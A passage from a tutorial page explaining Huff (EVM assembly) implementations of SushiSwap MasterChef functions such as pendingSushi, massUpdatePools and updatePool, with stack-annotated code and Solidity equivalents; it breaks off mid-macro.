</span><span>    user.rewardDebt </span><span style=color:#a71d5d;font-weight:700>=</span><span> user.amount </span><span style=color:#a71d5d;font-weight:700>*</span><span> pool.accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e12;
</span><span>
</span><span>    pool.lpToken.</span><span style=color:#62a35c>safeTransfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Withdraw</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, pid, amount);
</span><span>}
</span></code></pre></div></div><p>Solidity's require statement provides cleaner error handling than manual revert operations.<hr><h4 id=pending-sushi-calculate-pending-rewards>PENDING_SUSHI() - Calculate Pending Rewards</h4><p>View function that calculates pending SUSHI rewards for a user without modifying state. This function introduces the <code>number</code> opcode which retrieves the current block number, <code>lt</code> for less-than comparison, <code>and</code> for bitwise AND operations enabling complex conditional checks, and <code>jump</code> for unconditional control flow jumps. The function implements sophisticated conditional logic with multiple jump labels to handle different reward calculation scenarios: if the pool hasn't been updated since the last reward block or has zero LP supply, it uses the existing accSushiPerShare; otherwise, it calculates an updated accSushiPerShare value by fetching the LP token balance, computing the block multiplier using <code>INNER_GET_MULTIPLIER()</code>, and calculating new rewards. The final pending reward is derived from the user's staked amount, the (potentially updated) accSushiPerShare, and their reward debt.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: PENDING_SUSHI()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>PENDING_SUSHI</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(1) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(1) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>address
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [this, pool.lpToken, pool.accSushiPerShare, pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Pushes address(this) onto the stack
</span><span>
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Calls pool.lpToken.balanceOf(address(this))
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 number gt
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [currentBlock > lastRewardBlock, pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 iszero iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpSupply != 0, currentBlock > lastRewardBlock, pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>and iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [!((currentBlock > lastRewardBlock) && (lpSupply != 0)), pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>    condition_is_false_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Calculate Updated accSushiPerShare =====
</span><span>        </span><span style=color:#a71d5d;font-weight:700>number
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [currentBlock, pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#62a35c>INNER_GET_MULTIPLIER</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [multiplier, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#0086b3>[SUSHI_PER_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [sushiPerBlock, multiplier, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#62a35c>SAFE_MUL</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [pool.allocPoint, sushiReward, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#62a35c>SAFE_MUL</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward * allocPoint, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [totalAllocPoint, sushiReward * allocPoint, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#62a35c>SAFE_DIV</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [poolReward, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#0086b3>[E] </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(4) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [poolReward * 1e12 / lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#62a35c>SAFE_ADD</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [updatedAccSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap1 pop
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [updatedAccSushiPerShare]
</span><span>
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>
</span><span>    condition_is_false_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop pop
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, pool_slot]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap1 pop
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare]
</span><span>
</span><span>    end_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [accSushiPerShare] (either original or updated)
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Calculate User's Pending Rewards =====
</span><span>    </span><span style=color:#0086b3>[E]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [1e12, accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user, 1e12, accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, user, 1e12, accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [USER_INFO_SLOT, pid, user, 1e12, accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(3) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot, 1e12, accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, 1e12, accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt, user.amount, 1e12, accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [accSushiPerShare, user.amount, 1e12, user.rewardDebt]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>() </span><span style=color:#62a35c>SAFE_SUB</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(4) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pending]
</span><span>    </span><span style=color:#969896;font-style:italic>// pending = (user.amount * accSushiPerShare) / 1e12 - user.rewardDebt
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns pending reward amount
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>pendingSushi</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>address </span><span>user) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>    PoolInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo[pid];
</span><span>    UserInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>user </span><span style=color:#a71d5d;font-weight:700>=</span><span> userInfo[pid][_user];
</span><span>    </span><span style=color:#0086b3>uint256</span><span> accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.accSushiPerShare;
</span><span>    </span><span style=color:#0086b3>uint256</span><span> lpSupply </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.lpToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number ></span><span> pool.lastRewardBlock </span><span style=color:#a71d5d;font-weight:700>&&</span><span> lpSupply </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0) {
</span><span>        </span><span style=color:#0086b3>uint256</span><span> multiplier </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getMultiplier</span><span>(pool.lastRewardBlock, </span><span style=color:#a71d5d;font-weight:700>block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number</span><span>);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> sushiReward </span><span style=color:#a71d5d;font-weight:700>=</span><span> multiplier </span><span style=color:#a71d5d;font-weight:700>*</span><span> sushiPerBlock </span><span style=color:#a71d5d;font-weight:700>*</span><span> pool.allocPoint </span><span style=color:#a71d5d;font-weight:700>/</span><span> totalAllocPoint;
</span><span>        accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>=</span><span> accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>+</span><span> sushiReward </span><span style=color:#a71d5d;font-weight:700>*</span><span> 1e12 </span><span style=color:#a71d5d;font-weight:700>/</span><span> lpSupply;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> user.amount </span><span style=color:#a71d5d;font-weight:700>*</span><span> accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e12 </span><span style=color:#a71d5d;font-weight:700>-</span><span> user.rewardDebt;
</span><span>}
</span></code></pre></div></div><hr><p><strong>MASS_UPDATE_POOLS() - Update All Pools</strong><p>Updates reward variables for all pools by iterating through them. This function demonstrates how to implement loops in low-level EVM code using jump labels and conditional jumps, introducing iteration counter management with explicit stack-based loop variables. The function loads the total pool count, initializes a counter to zero, and uses labeled jumps (start_jump, continue_jump, end_jump) to create a loop structure that calls <code>INNER_UPDATE_POOL()</code> for each pool index from 0 to poolLength-1, incrementing the counter after each iteration until all pools are updated.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: MASS_UPDATE_POOLS</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>MASS_UPDATE_POOLS</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength == 0, poolLength]
</span><span>
</span><span>    end_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// If no pools exist, jump to end
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Initialize Loop =====
</span><span>    </span><span style=color:#0086b3>0x00
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [0, poolLength]
</span><span>    </span><span style=color:#969896;font-style:italic>// Initialize counter i = 0
</span><span>
</span><span>    start_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>    </span><span style=color:#969896;font-style:italic>// Jump to loop start
</span><span>
</span><span>    continue_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [i, poolLength]
</span><span>        </span><span style=color:#a71d5d;font-weight:700>eq </span><span>end_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#969896;font-style:italic>// If i == poolLength, exit loop
</span><span>
</span><span>        start_jump:
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [i, poolLength]
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup1
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [i, i, poolLength]
</span><span>
</span><span>        </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(1) returns(0)
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [i, poolLength]
</span><span>        </span><span style=color:#969896;font-style:italic>// Updates pool at index i
</span><span>
</span><span>        </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [i+1, poolLength]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup2 dup2
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [i+1, poolLength, i+1, poolLength]
</span><span>
</span><span>        continue_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>
</span><span>    end_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength, poolLength] or [poolLength] depending on path
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>massUpdatePools</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    </span><span style=color:#0086b3>uint256</span><span> length </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo.</span><span style=color:#a71d5d;font-weight:700>length</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>for </span><span>(</span><span style=color:#0086b3>uint256</span><span> pid </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0; pid &lt; length; pid++) {
</span><span>        </span><span style=color:#62a35c>updatePool</span><span>(pid);
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h4 id=update-pool-update-single-pool>UPDATE_POOL() - Update Single Pool</h4><p>Updates a single pool's reward variables by calling the internal <code>INNER_UPDATE_POOL()</code> macro after pool ID validation. The <code>INNER_UPDATE_POOL()</code> helper macro implements the core pool update logic with several conditional paths: if the current block hasn't advanced past the pool's lastRewardBlock, it returns early; if the LP token supply is zero, it only updates lastRewardBlock to the current block; otherwise, it performs a full reward calculation by computing the block multiplier, calculating SUSHI rewards earned, minting 10% to the dev address and the full sushiReward amount to address(this) (the Cheff contract itself), updating accSushiPerShare with the new rewards scaled by 1e12 divided by LP supply, and finally storing the updated accSushiPerShare and lastRewardBlock values. The <code>address</code> opcode pushes the current contract's address onto the stack.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: UPDATE_POOL()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>UPDATE_POOL</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Expands to inline pool update logic below
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#969896;font-style:italic>// INNER_UPDATE_POOL() expansion: takes(1) returns(0)
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>INNER_UPDATE_POOL</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>1</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for sha3 computation
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lastRewardBlock, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 number gt
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [currentBlock > lastRewardBlock, pool.lastRewardBlock, pool_slot]
</span><span>
</span><span>    block_number_bigger_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// If currentBlock > lastRewardBlock, jump to update logic
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop pop
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>
</span><span>    block_number_bigger_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lastRewardBlock, pool_slot]
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, pool_slot, pool.lastRewardBlock]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>address
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [this, pool.lpToken, pool_slot, pool.lastRewardBlock]
</span><span>    </span><span style=color:#969896;font-style:italic>// Pushes address(this) onto the stack
</span><span>
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpSupply, pool_slot, pool.lastRewardBlock]
</span><span>    </span><span style=color:#969896;font-style:italic>// Calls pool.lpToken.balanceOf(address(this))
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for ERC20 call encoding
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpSupply, lpSupply, pool_slot, pool.lastRewardBlock]
</span><span>
</span><span>    lp_supply_not_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// If lpSupply == 0, only update lastRewardBlock
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot + 2, pool.lastRewardBlock]
</span><span>        </span><span style=color:#a71d5d;font-weight:700>number swap1
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot + 2, currentBlock]
</span><span>        </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>        </span><span style=color:#969896;font-style:italic>// storage[pool_slot + 2] = currentBlock
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>
</span><span>    lp_supply_not_zero_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpSupply, pool_slot, pool.lastRewardBlock]
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 number
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [currentBlock, pool.lastRewardBlock, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#62a35c>INNER_GET_MULTIPLIER</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [multiplier, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#0086b3>[SUSHI_PER_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiPerBlock, multiplier, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [multiplier * sushiPerBlock, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.allocPoint, multiplier * sushiPerBlock, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [multiplier * sushiPerBlock * pool.allocPoint, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload swap1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [multiplier * sushiPerBlock * pool.allocPoint, totalAllocPoint, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload dup1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushi, sushi, sushiReward, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x0a </span><span style=color:#a71d5d;font-weight:700>dup4
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward, 0x0a, sushi, sushi, sushiReward, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward / 10, sushi, sushi, sushiReward, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [devAddr, sushiReward / 10, sushi, sushi, sushiReward, pool_slot, lpSupply]
</span><span>
</span><span>    </span><span style=color:#62a35c>SUSHI_MINT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushi, sushiReward, pool_slot, lpSupply]
</span><span>    </span><span style=color:#969896;font-style:italic>// Mints sushiReward / 10 to devAddr
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for mint call encoding
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 address
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [address(this), sushiReward, sushi, sushiReward, pool_slot, lpSupply]
</span><span>    </span><span style=color:#969896;font-style:italic>// dup2 duplicates sushiReward, address pushes address(this)
</span><span>
</span><span>    </span><span style=color:#62a35c>SUSHI_MINT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward, pool_slot, lpSupply]
</span><span>    </span><span style=color:#969896;font-style:italic>// Mints sushiReward to address(this) - the Cheff contract
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for mint call encoding
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 swap2 swap1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward, lpSupply, pool_slot]
</span><span>
</span><span>    </span><span style=color:#0086b3>[E]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [1e12, sushiReward, lpSupply, pool_slot]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward * 1e12, lpSupply, pool_slot]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_DIV</span><span>()
